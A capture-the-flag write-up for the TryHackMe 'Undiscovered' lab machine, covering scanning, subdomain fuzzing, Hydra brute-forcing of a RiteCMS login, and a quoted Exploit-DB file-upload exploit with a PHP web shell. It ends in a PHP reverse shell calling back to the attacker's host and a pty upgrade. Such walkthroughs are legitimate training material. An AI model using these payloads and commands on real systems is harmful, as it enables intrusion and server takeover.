# Undiscovered — Writeup

## Overview
### Undiscovered — Writeup
### Undiscovered — Writeup
----
Discovery consists not in seeking new landscapes, but in having new eyes..
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/8cb5aae2040b1e4c66926f9d92f1c573.jpeg)
Start Machine
Please allow 5 minutes for this instance to fully deploy before attacking. This vm was developed in collaboration with [@H0j3n](https://tryhackme.com/p/H0j3n), thanks to him for the foothold and privilege escalation ideas.
Please consider adding **undiscovered.thm** in /etc/hosts
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts         
10.10.135.201 undiscovered.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.135.201 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.135.201:22
Open 10.10.135.201:80
Open 10.10.135.201:111
Open 10.10.135.201:2049
Open 10.10.135.201:42328
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org )
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Connect Scan
Scanning undiscovered.thm (10.10.135.201) [5 ports]
Discovered open port 22/tcp on 10.10.135.201
Discovered open port 111/tcp on 10.10.135.201
Discovered open port 80/tcp on 10.10.135.201
Discovered open port 2049/tcp on 10.10.135.201
Discovered open port 42328/tcp on 10.10.135.201
Completed Connect Scan (5 total ports)
Initiating Service scan
Scanning 5 services on undiscovered.thm (10.10.135.201)
Completed Service scan (5 services on 1 host)
NSE: Script scanning 10.10.135.201.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for undiscovered.thm (10.10.135.201)
Host is up, received user-set (0.18s latency).

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0m4DmvKkWm3OoELtyKxq4G9yM29DEggmEsfKv2fzZh1G6EiPS/pKPQV/u8InqwPyyJZv82Apy4pVBYL7KJTTZkxBLbrJplJ6YnZD5xZMd8tf4uLw5ZCilO6oLDKH0pchPmQ2x2o5x2Xwbzfk4KRbwC+OZ4f1uCageOptlsR1ruM7boiHsPnDO3kCujsTU/4L19jJZMGmJZTpvRfcDIhelzFNxCMwMUwmlbvhiCf8nMwDaBER2HHP7DKXF95uSRJWKK9eiJNrk0h/K+3HkP2VXPtcnLwmbPhzVHDn68Dt8AyrO2d485j9mLusm4ufbrUXSyfM9JxYuL+LDrqgtUxxP
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAcr7A7L54JP/osGx6nvDs5y3weM4uwfT2iCJbU5HPdwGHERLCAazmr/ss6tELaj7eNqoB8LaM2AVAVVGQXBhc8=
|   256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9WA55JtThufX7BcByUR5/JGKGYsIlgPxEiS0xqLlIA
80/tcp    open  http     syn-ack Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      39140/udp   nlockmgr
|   100021  1,3,4      41891/tcp6  nlockmgr
|   100021  1,3,4      42328/tcp   nlockmgr
|   100021  1,3,4      58712/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      syn-ack 2-4 (RPC #100003)
42328/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.135.201                       
clnt_create: RPC: Program not registered

<h1>Remember....</h1>

<p>The path should be the darker one...</p>

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u undiscovered.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.undiscovered.thm" --hc 404 --hw 26
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://undiscovered.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================

000000491:   200        68 L     341 W      4584 Ch     "manager"                  
000000522:   200        82 L     341 W      4650 Ch     "deliver"                  
000000516:   200        68 L     341 W      4626 Ch     "dashboard"                
000000566:   200        68 L     341 W      4584 Ch     "newsite"                  
000000612:   200        68 L     341 W      4584 Ch     "develop"                  
000000630:   200        68 L     341 W      4542 Ch     "forms"                    
000000628:   200        68 L     341 W      4584 Ch     "network"                  
000000633:   200        68 L     341 W      4668 Ch     "maintenance"              
000000665:   200        68 L     341 W      4521 Ch     "view"                     
000000685:   200        83 L     341 W      4599 Ch     "booking"                  
000000691:   200        68 L     341 W      4605 Ch     "terminal"                 
000000674:   200        68 L     341 W      4605 Ch     "mailgate"                 
000000678:   200        68 L     341 W      4521 Ch     "play"                     
000000680:   200        68 L     341 W      4542 Ch     "start"                    
000000702:   200        68 L     341 W      4626 Ch     "resources"                
000000694:   200        68 L     341 W      4521 Ch     "gold"                     
000000696:   200        68 L     341 W      4605 Ch     "internet"                 
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 245.3061
Processed Requests: 7488
Filtered Requests: 7471
Requests/sec.: 30.52512

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.135.201 undiscovered.thm manager.undiscovered.thm deliver.undiscovered.thm

http://manager.undiscovered.thm/

Powered by RiteCMS Version:2.2.1

https://www.exploit-db.com/exploits/48636

1- Go to following url. >> http://(HOST)/cms/
2- Default username and password is admin:admin. We must know login credentials.
3- Go to "Filemanager" and press "Upload file" button.
4- Choose your php web shell script and upload it. 
     
PHP Web Shell Code == <?php system($_GET['cmd']); ?>

5- You can find uploaded file there. >> http://(HOST)/media/(FILE-NAME).php
6- We can execute a command now. >> http://(HOST)/media/(FILE-NAME).php?cmd=id

http://deliver.undiscovered.thm/cms/

User unknown or password wrong

hydra -- brute forcing

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished

http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=media

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                      
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.135.201] 34486
SOCKET: Shell has connected! PID: 1681
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ ls
ls
payload_ivan.php  smilies
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ cd /home
cd /home
www-data@undiscovered:/home$ ls
ls
leonard  william
www-data@undiscovered:/home$ cd william
cd william
bash: cd: william: Permission denied
www-data@undiscovered:/home$ cd leonard
cd leonard
bash: cd: leonard: Permission denied

www-data@undiscovered:/var/www$ ls
ls
booking.undiscovered.thm      manager.undiscovered.thm
dashboard.undiscovered.thm    network.undiscovered.thm
deliver.undiscovered.thm      newsite.undiscovered.thm
develop.undiscovered.thm      play.undiscovered.thm
forms.undiscovered.thm	      resources.undiscovered.thm
gold.undiscovered.thm	      start.undiscovered.thm
html			      terminal.undiscovered.thm
internet.undiscovered.thm     undiscovered.thm
mailgate.undiscovered.thm     view.undiscovered.thm
maintenance.undiscovered.thm

www-data@undiscovered:/var/www/deliver.undiscovered.thm/data/sql$ cat sqlite.user.initial.sql
<www/deliver.undiscovered.thm/data/sql$ cat sqlite.user.initial.sql          
